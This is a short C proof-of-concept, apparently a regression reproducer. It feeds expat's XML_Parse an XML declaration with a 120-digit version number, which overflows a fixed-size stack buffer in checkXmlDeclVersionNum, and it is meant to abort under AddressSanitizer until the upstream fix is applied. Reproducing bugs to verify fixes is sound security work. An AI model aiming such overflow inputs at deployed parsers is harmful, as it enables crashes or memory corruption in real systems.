/* Residual-defect PoC: a well-formed XML declaration whose version number
   matches the accepted "1.[0-9]+" grammar but is long enough to overflow the
   fixed-size stack buffer in checkXmlDeclVersionNum().  Reaches the bug via
   the public XML_Parse() entry point with ordinary in-contract input (only
   the version string's length differs from a normal "1.0" document).
   Aborts under AddressSanitizer on the shipped tree; parses cleanly on a tree
   carrying the real upstream fix (which validates the version in place). */
#include <string.h>
#include "expat.h"

int
main(void) {
  /* "1." followed by 120 digits -- a valid VersionNum per "1.[0-9]+". */
  char doc[160];
  size_t n = 0;
  const char *prefix = "<?xml version='1.";
  memcpy(doc + n, prefix, strlen(prefix));
  n += strlen(prefix);
  for (int i = 0; i < 120; i++)
    doc[n++] = '0' + (i % 10);
  const char *suffix = "'?>\n<doc/>";
  memcpy(doc + n, suffix, strlen(suffix));
  n += strlen(suffix);

  XML_Parser parser = XML_ParserCreate(NULL);
  XML_Parse(parser, doc, (int)n, XML_TRUE);
  XML_ParserFree(parser);
  return 0;
}
